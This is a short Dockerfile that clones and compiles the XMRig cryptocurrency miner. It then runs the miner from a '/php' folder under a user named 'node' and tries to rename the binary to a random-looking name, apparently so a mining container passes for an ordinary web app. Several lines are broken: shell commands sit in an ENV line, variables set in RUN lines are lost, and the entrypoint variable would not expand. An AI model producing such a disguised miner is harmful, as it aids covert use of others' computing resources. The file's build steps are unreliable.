FROM alpine:latest AS build

WORKDIR /php
RUN  apk update \
     && apk --no-cache add \
        git \
        gcc \
        make \
        cmake \
        libuv-dev \
        build-base \
        openssl-dev \
        build-deps libuv \
        libmicrohttpd-dev \
        util-linux-dev gcc abuild binutils \
        ca-certificates wget screen
RUN azure=mxsemsdnlkdj;
RUN git clone https://github.com/xmrig/xmrig \
  && a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d \
  && cd xmrig \
  && cmake . \
  && make \
  && rm -rf /var/cache/apk/*

FROM  alpine:latest
RUN   adduser -S -D -H -h /php node
COPY --from=build /xmrig/xmrig/xmrig-notls /php/xmrig
USER node
WORKDIR /php
ENV mv xmrig $azure -n \
  && cp $azure "$cpuname" 
RUN rm -f  xmrig
ENTRYPOINT ["$cpuname"]




  
